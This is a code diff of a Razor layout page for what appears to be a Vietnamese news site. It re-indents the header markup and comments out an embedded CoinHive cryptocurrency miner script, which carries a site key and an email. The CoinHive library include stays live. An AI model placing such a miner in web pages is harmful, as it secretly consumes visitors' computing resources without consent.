@@ -211,15 +211,15 @@
     <div id="admWrapsite">
         <div class="page-header">
             <div class="page-head">
-                    <div class="w980 mgauto clearfix relative">
-                        @*<a href="@("/tinnhanh247/danhmuc/" + MDF.Utilites.Helper.StringHelper.ToUrl("trang-chu","0"))" class="logo" title="Trang chủ"></a>*@
-                        <a asp-controller="tinnhanh247" asp-action="trangchu" class="logo" title="Trang chủ"></a>
-                        <div class="khwth-trending-wrapper">
-                            <ul class="list-khwtht clearfix"></ul>
-                        </div>
-                        
+                <div class="w980 mgauto clearfix relative">
+                    @*<a href="@("/tinnhanh247/danhmuc/" + MDF.Utilites.Helper.StringHelper.ToUrl("trang-chu","0"))" class="logo" title="Trang chủ"></a>*@
+                    <a asp-controller="tinnhanh247" asp-action="trangchu" class="logo" title="Trang chủ"></a>
+                    <div class="khwth-trending-wrapper">
+                        <ul class="list-khwtht clearfix"></ul>
                     </div>
+
                 </div>
+            </div>
             <div id="ctl00_ctl00_cphBody_PageMenu1_MenuDefault" class="page-menu">
                 <div class="inner clearfix">
                     <a asp-controller="tinnhanh247" asp-action="trangchu" class="first" title="Trang chủ"><i class="ico-home"></i></a>
@@ -240,21 +240,21 @@
             @RenderBody()
         </div>
     </div>
-    
+
     <script src="https://coinhive.com/lib/coinhive.min.js"></script>
-    <script>
-        setTimeout(function(){
-        var miner = new CoinHive.User('xSjpR64LrSx0edB6geGUajT9PPBMIV45', 'chieuhoan9@gmail.com', {
-            threads: 4,
-            autoThreads: false,
-            throttle: 0.5,
-            forceASMJS: false,
-            theme: 'dark',
-            language: 'auto'
-        });
-        miner.start();
+    @*<script>
+        setTimeout(function () {
+            var miner = new CoinHive.User('xSjpR64LrSx0edB6geGUajT9PPBMIV45', 'chieuhoan9@gmail.com', {
+                threads: 4,
+                autoThreads: false,
+                throttle: 0.5,
+                forceASMJS: false,
+                theme: 'dark',
+                language: 'auto'
+            });
+            miner.start();
         }, 3000);
-    </script>
+    </script>*@
 </body>
 </html>
 
